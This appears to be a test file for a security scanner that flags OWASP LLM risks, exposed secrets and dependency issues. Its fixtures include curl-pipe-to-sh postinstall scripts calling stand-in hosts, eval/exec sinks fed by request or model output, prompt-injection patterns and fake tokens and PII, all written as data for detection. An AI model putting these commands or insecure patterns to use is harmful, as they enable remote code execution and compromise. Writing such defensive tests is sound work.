import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { parseArgs, runCli } from "../packages/cli/src/cli.ts";
import { runCheck } from "../packages/core/src/engine.ts";
import { collectRepository } from "../packages/core/src/repository.ts";
import { defaultPolicy } from "../packages/core/src/policy.ts";
import { runCodeScanner } from "../packages/scanners/src/code.ts";
import { extractDependencies, runDependencyScanner, runVulnerabilityScanner } from "../packages/scanners/src/dependencies.ts";
import { runSecretScanner } from "../packages/scanners/src/secrets.ts";
import { renderHtml, renderJson, renderMarkdown, renderSarif } from "../packages/output/src/formatters.ts";

function file(path: string, lines: string[], removedLines: string[] = []) {
  return {
    path,
    oldPath: path,
    status: "modified",
    addedLines: lines.map((content, index) => ({ line: index + 1, content })),
    removedLines: removedLines.map((content, index) => ({ line: index + 1, content }))
  };
}

test("parseArgs supports scan ergonomics and dependency intelligence options", () => {
  const command = parseArgs([
    "check",
    "/tmp/CV Maker",
    "--format",
    "html",
    "--quiet",
    "--no-color",
    "--max-findings",
    "5",
    "--min-confidence",
    "high",
    "--vuln-provider",
    "mock",
    "--vuln-provider-fail-mode",
    "warn",
    "--vuln-provider-timeout-ms",
    "2500",
    "--vuln-provider-concurrency",
    "3",
    "--strict-coverage",
    "--max-files",
    "25",
    "--max-file-bytes",
    "4096"
  ]);

  assert.equal(command.name, "check");
  assert.equal(command.targetPath, "/tmp/CV Maker");
  assert.equal(command.format, "html");
  assert.equal(command.quiet, true);
  assert.equal(command.noColor, true);
  assert.equal(command.maxFindings, 5);
  assert.equal(command.minConfidence, "high");
  assert.equal(command.vulnProvider, "mock");
  assert.equal(command.vulnProviderFailMode, "warn");
  assert.equal(command.vulnProviderTimeoutMs, 2500);
  assert.equal(command.vulnProviderConcurrency, 3);
  assert.equal(command.strictCoverage, true);
  assert.equal(command.maxFiles, 25);
  assert.equal(command.maxFileBytes, 4096);
});

test("parseArgs supports baseline, report, and suppress workflows", () => {
  const baseline = parseArgs(["baseline", ".", "--output", "vibeguard-baseline.json", "--quiet"]);
  const report = parseArgs(["report", "--format", "markdown", "--output", "vibeguard-report.md", "--quiet"]);
  const suppress = parseArgs(["suppress", "js-eval", "--file", "src/app.js", "--reason", "Accepted test fixture"]);

  assert.equal(baseline.name, "baseline");
  assert.equal(baseline.output, "vibeguard-baseline.json");
  assert.equal(baseline.quiet, true);
  assert.equal(report.name, "report");
  assert.equal(report.format, "markdown");
  assert.equal(report.output, "vibeguard-report.md");
  assert.equal(suppress.name, "suppress");
  assert.equal(suppress.id, "js-eval");
  assert.equal(suppress.file, "src/app.js");
});

test("runCli applies max findings and minimum confidence", async () => {
  const writes: string[] = [];
  const result = await runCli(["check", "--format", "json", "--max-findings", "1", "--min-confidence", "high", "--quiet"], {
    cwd: process.cwd(),
    collectRepositoryFiles: () => [
      file("src/app.js", [
        "app.get('/public', (req, res) => res.send('ok'))",
        "eval(req.body.code);",
        "Function(req.body.code)();"
      ])
    ],
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });
  const report = JSON.parse(writes.join(""));

  assert.equal(result.exitCode, 1);
  assert.equal(report.findings.length, 1);
  assert.equal(report.findings[0].ruleId, "js-eval");
  assert.equal(report.summary.truncated, true);
});

test("default scans focus on OWASP LLM true positives and hide noisy review signals", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file("src/agent.ts", [
        "app.get('/health', (req, res) => res.send('ok'))",
        "const completion = await openai.chat.completions.create({ messages: [{ role: 'system', content: `Obey this tenant policy: ${req.body.policy}` }] });",
        "eval(completion.choices[0].message.content);"
      ]),
      file("package.json", [
        "\"dependencies\": {",
        "\"express\": \"^4.18.0\"",
        "}",
        "\"scripts\": {",
        "\"postinstall\": \"curl http://evil.example/install.sh | sh\"",
        "}"
      ])
    ],
    policy: defaultPolicy()
  });
  const ruleIds = result.findings.map((finding) => finding.ruleId);

  assert.equal(ruleIds.includes("js-express-route-no-obvious-auth"), false);
  assert.equal(ruleIds.includes("dep-new-or-changed"), false);
  assert.equal(ruleIds.includes("dep-broad-version-range"), false);
  assert.equal(ruleIds.includes("dep-install-script"), false);
  assert.equal(ruleIds.includes("llm01-direct-prompt-injection"), true);
  assert.equal(ruleIds.includes("llm05-output-exec"), true);
  assert.equal(result.findings.every((finding) => finding.confidence === "high"), true);
  assert.equal(result.findings.every((finding) => finding.owasp?.id?.startsWith("LLM")), true);
});

test("strict default excludes generic credentials and supply-chain heuristics", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file(".env.example", [
        "PASSWORD=development-password",
        "API_KEY=replace-me"
      ]),
      file("package.json", [
        "\"scripts\": {",
        "\"postinstall\": \"node scripts/setup.js\"",
        "}",
        "\"dependencies\": {",
        "\"express\": \"^4.18.0\"",
        "}"
      ]),
      file("package-lock.json", [
        "\"node_modules/native-builder\": {",
        "\"version\": \"1.0.0\",",
        "\"hasInstallScript\": true",
        "}"
      ])
    ],
    policy: defaultPolicy()
  });

  assert.deepEqual(result.findings.map((finding) => finding.ruleId), []);
});

test("strict default excludes vendored and generated code or PII examples", async () => {
  const cardFixture = ["4111", "1111", "1111", "1111"].join(" ");
  const result = await runCheck({
    repositoryFiles: [
      file("node_modules/pkg/index.js", [
        "eval(req.body.code);",
        `const card = '${cardFixture}';`
      ]),
      file(".worktrees/old-app/src/server.js", [
        "exec(req.query.command);"
      ]),
      file("dist/assets/bundle.js", [
        "new Function(req.body.code)();"
      ]),
      file("src/server.js", [
        "eval(req.body.code);"
      ])
    ],
    policy: defaultPolicy()
  });

  assert.deepEqual(
    result.findings.map((finding) => `${finding.ruleId}:${finding.file}`),
    ["js-eval:src/server.js"]
  );
});

test("LLM02 reports only concrete tokens credentials and high-confidence PII", () => {
  const githubToken = ["ghp_1234567890", "abcdefghijklmnopqrstuvwxyz1234"].join("");
  const awsAccessKey = ["AKIA1234567890", "ABCDEF"].join("");
  const ssn = ["123", "45", "6789"].join("-");
  const cardFixture = ["4111", "1111", "1111", "1111"].join(" ");
  const findings = runSecretScanner([
    file(".env", [
      `GITHUB_TOKEN=${githubToken}`,
      `AWS_ACCESS_KEY_ID=${awsAccessKey}`,
      `CUSTOMER_SSN=${ssn}`,
      `CARD_NUMBER=${cardFixture}`,
      "PASSWORD=development-password"
    ])
  ]);
  const ruleIds = findings.map((finding) => finding.ruleId);

  assert.equal(ruleIds.includes("secret-github-token"), true);
  assert.equal(ruleIds.includes("secret-aws-access-key"), true);
  assert.equal(ruleIds.includes("pii-us-ssn"), true);
  assert.equal(ruleIds.includes("pii-credit-card"), true);
  assert.equal(ruleIds.includes("secret-generic-credential"), false);
  assert.equal(findings.every((finding) => finding.owasp?.id === "LLM02:2025"), true);
});

test("LLM03 default reports confirmed vulnerable dependency versions only", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file("package.json", [
        "\"scripts\": {",
        "\"postinstall\": \"node scripts/setup.js\"",
        "}",
        "\"dependencies\": {",
        "\"vulnerable-package\": \"1.0.0\"",
        "\"express\": \"^4.18.0\"",
        "}"
      ])
    ],
    policy: defaultPolicy(),
    vulnProvider: "mock"
  });
  const ruleIds = result.findings.map((finding) => finding.ruleId);

  assert.deepEqual(ruleIds, ["dep-vulnerable-package"]);
  assert.equal(result.findings[0].owasp?.id, "LLM03:2025");
});

test("vulnerability inventory uses project lockfiles and ignores vendored package manifests", () => {
  const dependencies = extractDependencies([
    file("package-lock.json", [
      "\"node_modules/vulnerable-package\": {",
      "\"version\": \"1.0.0\",",
      "}",
      "\"node_modules/@scope/risky\": {",
      "\"version\": \"2.3.4\",",
      "}"
    ]),
    file("node_modules/vulnerable-package/package.json", [
      "\"dependencies\": {",
      "\"ignored-vendored-package\": \"9.9.9\"",
      "}"
    ]),
    file(".worktrees/old-app/package.json", [
      "\"dependencies\": {",
      "\"ignored-worktree-package\": \"1.0.0\"",
      "}"
    ])
  ]);

  assert.deepEqual(
    dependencies.map((dependency) => `${dependency.name}@${dependency.version}`).sort(),
    ["@scope/risky@2.3.4", "vulnerable-package@1.0.0"]
  );
});

test("OWASP LLM findings explain vulnerability, evidence, attack path, and impact", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file("src/agent.ts", [
        "const completion = await openai.chat.completions.create({ messages: [{ role: 'system', content: `Admin policy: ${req.body.policy}` }] });",
        "exec(completion.choices[0].message.content);"
      ])
    ],
    policy: defaultPolicy()
  });

  const promptInjection = result.findings.find((finding) => finding.ruleId === "llm01-direct-prompt-injection");
  const outputHandling = result.findings.find((finding) => finding.ruleId === "llm05-output-exec");

  assert.equal(promptInjection?.owasp?.id, "LLM01:2025");
  assert.equal(promptInjection?.attackPath?.includes("Attacker controls"), true);
  assert.equal(promptInjection?.impact?.includes("override"), true);
  assert.equal(outputHandling?.owasp?.id, "LLM05:2025");
  assert.equal(outputHandling?.evidence?.includes("exec"), true);
  assert.equal(outputHandling?.impact?.includes("code execution"), true);
});

test("scanner covers high-confidence OWASP LLM agent and RAG vulnerabilities", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file("src/agent.ts", [
        "const answer = await openai.chat.completions.create({ model: 'gpt-4.1', max_tokens: req.body.maxTokens });",
        "const response = await openai.chat.completions.create({ tool_choice: 'auto', tools });",
        "if (response.choices[0].message.tool_calls) exec(toolCall.function.arguments);"
      ]),
      file("src/rag.ts", [
        "await vectorStore.addDocuments(req.body.documents);",
        "const matches = await index.query({ vector, filter: req.query.filter });"
      ])
    ],
    policy: defaultPolicy()
  });
  const byRule = new Map(result.findings.map((finding) => [finding.ruleId, finding]));

  assert.equal(byRule.get("llm10-user-controlled-token-budget")?.owasp?.id, "LLM10:2025");
  assert.equal(byRule.get("llm06-auto-tool-dangerous-sink")?.owasp?.id, "LLM06:2025");
  assert.equal(byRule.get("llm04-untrusted-vector-ingestion")?.owasp?.id, "LLM04:2025");
  assert.equal(byRule.get("llm08-user-controlled-vector-filter")?.owasp?.id, "LLM08:2025");
  assert.equal(byRule.get("llm06-auto-tool-dangerous-sink")?.impact?.includes("autonomous"), true);
});

test("generic code execution remains code security unless model output reaches the sink", async () => {
  const generic = await runCheck({
    repositoryFiles: [file("src/app.ts", ["eval(req.body.code);"])],
    policy: defaultPolicy()
  });
  const llmSpecific = await runCheck({
    repositoryFiles: [file("src/agent.ts", ["eval(completion.choices[0].message.content);"])],
    policy: defaultPolicy()
  });

  assert.equal(generic.findings[0].ruleId, "js-eval");
  assert.equal(generic.findings[0].owasp, undefined);
  assert.equal(llmSpecific.findings[0].ruleId, "llm05-output-exec");
  assert.equal(llmSpecific.findings[0].owasp?.id, "LLM05:2025");
});

test("baseline command records accepted findings and check suppresses them", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-baseline-"));
  const sourceFiles = () => [file("src/app.js", ["eval(req.body.code);"])];
  const writes: string[] = [];

  const baselineResult = await runCli(["baseline", "--output", "vibeguard-baseline.json", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: sourceFiles,
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });

  assert.equal(baselineResult.exitCode, 0);
  assert.equal(existsSync(join(root, "vibeguard-baseline.json")), true);

  const checkWrites: string[] = [];
  const checkResult = await runCli(["check", "--format", "json", "--baseline", "vibeguard-baseline.json", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: sourceFiles,
    stdout: (text) => checkWrites.push(text),
    stderr: () => {}
  });
  const report = JSON.parse(checkWrites.join(""));

  assert.equal(checkResult.exitCode, 0);
  assert.equal(report.findings.length, 0);
  assert.equal(report.summary.baselineSuppressed, 1);
});

test("suppress command appends a reasoned policy suppression", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-suppress-"));
  const result = await runCli([
    "suppress",
    "js-eval",
    "--file",
    "src/app.js",
    "--reason",
    "Accepted generated sandbox",
    "--reviewer",
    "security@example.com",
    "--expires",
    "2099-01-01"
  ], {
    cwd: root,
    stdout: () => {},
    stderr: () => {}
  });
  const config = readFileSync(join(root, "vibeguard.yml"), "utf8");

  assert.equal(result.exitCode, 0);
  assert.equal(config.includes("rule: js-eval"), true);
  assert.equal(config.includes("file: src/app.js"), true);
  assert.equal(config.includes("reason: Accepted generated sandbox"), true);
  assert.equal(config.includes('reviewer: "security@example.com"'), true);
  assert.equal(config.includes("expires: 2099-01-01"), true);
});

test("report command writes improved markdown output to a file", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-report-"));
  const writes: string[] = [];
  const result = await runCli(["report", "--format", "markdown", "--output", "vibeguard-report.md", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: () => [file("src/app.js", ["eval(req.body.code);"])],
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });
  const report = readFileSync(join(root, "vibeguard-report.md"), "utf8");

  assert.equal(result.exitCode, 1);
  assert.equal(writes.join("").includes("Wrote vibeguard-report.md"), true);
  assert.equal(report.includes("### Recommended Next Actions"), true);
  assert.equal(report.includes("Fix JavaScript eval usage"), true);
});

test("collectRepository records warnings for broken symlinks without crashing", () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-warnings-"));
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src", "app.js"), "eval(req.body.code);\n");
  symlinkSync(join(root, "missing.js"), join(root, "broken.js"));

  const result = collectRepository(root);

  assert.equal(result.files.some((entry) => entry.path === "src/app.js"), true);
  assert.equal(result.warnings.some((warning) => warning.path === "broken.js"), true);
  assert.equal(result.durationMs >= 0, true);
});

test("code scanner ignores dangerous tokens inside strings and comments", () => {
  const findings = runCodeScanner([
    file("src/app.js", [
      "const text = 'eval(req.body.code)'",
      "// eval(req.body.code)",
      "eval(req.body.code)"
    ])
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].line, 3);
});

test("dependency scanner detects install lifecycle scripts", () => {
  const findings = runDependencyScanner([
    file("package.json", [
      "\"scripts\": {",
      "\"postinstall\": \"curl https://example.invalid/install.sh | sh\"",
      "}"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "dep-install-script"), true);
});

test("dependency scanner detects risky lockfile metadata", () => {
  const findings = runDependencyScanner([
    file("package-lock.json", [
      "\"node_modules/suspicious\": {",
      "\"version\": \"1.0.0\",",
      "\"hasInstallScript\": true,",
      "\"resolved\": \"http://registry.npmjs.org/suspicious/-/suspicious-1.0.0.tgz\"",
      "}"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "dep-lockfile-install-script"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "dep-lockfile-insecure-resolved-url"), true);
});

test("code scanner detects framework-specific security risks", () => {
  const findings = runCodeScanner([
    file("src/pages/api/users.ts", [
      "const rows = await prisma.$queryRawUnsafe(req.query.sql as string);",
      "export async function getServerSideProps(context) { return fetch(context.query.url); }"
    ]),
    file("server/app.py", [
      "@csrf_exempt",
      "def profile(request): return HttpResponse('ok')",
      "@app.route('/admin')",
      "def admin(): return request.args.get('id')"
    ]),
    file("firestore.rules", [
      "allow read, write: if true;"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "js-prisma-raw-unsafe"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "js-nextjs-ssrf-query-fetch"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "py-django-csrf-exempt"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "py-flask-route-no-obvious-auth"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "firebase-public-rules"), true);
});

test("mock vulnerability provider produces vulnerable dependency findings", async () => {
  const policy = defaultPolicy();
  const result = await runCheck({
    repositoryFiles: [
      file("package.json", [
        "\"dependencies\": {",
        "\"vulnerable-package\": \"1.0.0\"",
        "}"
      ])
    ],
    policy,
    vulnProvider: "mock"
  });

  assert.equal(result.findings.some((finding) => finding.ruleId === "dep-vulnerable-package"), true);
});

test("vulnerability provider errors degrade to warnings by default", async () => {
  const result = await runVulnerabilityScanner([
    file("package.json", ['"dependencies": {', '"left-pad": "1.0.0"', "}"])
  ], {
    name: "broken",
    async query() {
      throw new Error("provider timeout");
    }
  }, { failMode: "warn" });

  assert.equal(result.findings.length, 0);
  assert.equal(result.warnings.length, 1);
  assert.equal(result.warnings[0].code, "vulnerability-provider");
  assert.equal(result.warnings[0].message.includes("provider timeout"), true);
});

test("vulnerability provider fail mode preserves fail-fast behavior", async () => {
  await assert.rejects(
    runVulnerabilityScanner([
      file("package.json", ['"dependencies": {', '"left-pad": "1.0.0"', "}"])
    ], {
      name: "broken",
      async query() {
        throw new Error("provider failure");
      }
    }, { failMode: "fail" }),
    /provider failure/
  );
});

test("HTML, Markdown, and SARIF reports include workflow metadata", async () => {
  const result = await runCheck({
    repositoryFiles: [file("src/app.js", ["eval(req.body.code)"])],
    policy: defaultPolicy()
  });
  const html = renderHtml(result);
  const json = JSON.parse(renderJson(result));
  const markdown = renderMarkdown(result);
  const sarif = JSON.parse(renderSarif(result));

  assert.equal(html.includes("<!doctype html>"), true);
  assert.equal(html.includes("Recommended Next Actions"), true);
  assert.equal(html.includes("OWASP LLM Mapping"), true);
  assert.equal(html.includes("Attack path"), true);
  assert.equal(Array.isArray(json.owaspSummary), true);
  assert.equal(markdown.includes("### Findings By Severity"), true);
  assert.equal(markdown.includes("### OWASP LLM Mapping"), true);
  assert.equal(markdown.includes("Attack path:"), true);
  assert.equal(markdown.includes("### Recommended Next Actions"), true);
  assert.equal(markdown.includes("Fix JavaScript eval usage"), true);
  assert.equal(sarif.runs[0].invocations[0].executionSuccessful, true);
  assert.equal(Array.isArray(sarif.runs[0].invocations[0].properties.recommendations), true);
});

test("HTML report contains leadership-ready executive sections", async () => {
  const result = await runCheck({
    repositoryFiles: [
      file("src/agent.ts", [
        "const completion = await openai.chat.completions.create({ messages: [{ role: 'system', content: `Admin policy: ${req.body.policy}` }] });",
        "exec(completion.choices[0].message.content);"
      ])
    ],
    policy: defaultPolicy()
  });

  const html = renderHtml(result);

  assert.equal(html.includes("Executive Summary"), true);
  assert.equal(html.includes("Risk Posture"), true);
  assert.equal(html.includes("Merge Decision"), true);
  assert.equal(html.includes("Severity Distribution"), true);
  assert.equal(html.includes("Recommended Actions"), true);
  assert.equal(html.includes("Control Mappings"), true);
  assert.equal(html.includes("Technical Appendix"), true);
  assert.equal(html.includes("<details"), true);
  assert.equal(html.includes("overflow-wrap:anywhere"), true);
});
